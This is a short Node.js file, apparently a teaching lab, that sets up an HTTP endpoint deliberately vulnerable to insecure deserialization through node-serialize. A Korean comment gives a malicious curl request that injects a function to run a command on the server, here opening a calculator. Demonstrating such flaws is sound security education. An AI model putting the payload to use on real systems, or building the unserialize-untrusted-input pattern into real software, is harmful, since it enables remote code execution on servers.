/*
    input
    정상 입력
    curl -X POST http://localhost:3000/deserialize -d "user={\"name\":\"jeong\"}"
    
    악성 입력
    curl -X POST http://localhost:3000/deserialize -d "user={\"name\":\"jeong\",\"toString\":\"_$$ND_FUNC$$_function(){require('child_process').exec('calc')}\"}"

*/


const http = require('http');
const serialize = require('node-serialize');
const querystring = require('querystring');


const server = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/deserialize') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            try {
                const parsed = querystring.parse(body);
                const userData = parsed.user;

            
                const obj = serialize.unserialize(userData);
                obj.toString();
                res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
                res.end(`Hello, ${obj.name}`);
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'text/plain; charset=utf-8' });
                res.end('역직렬화 에러');
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end('페이지 없음');
    }
});


const PORT = 3000;
server.listen(PORT, () => {
    console.log(`http://localhost:${PORT}`);
});
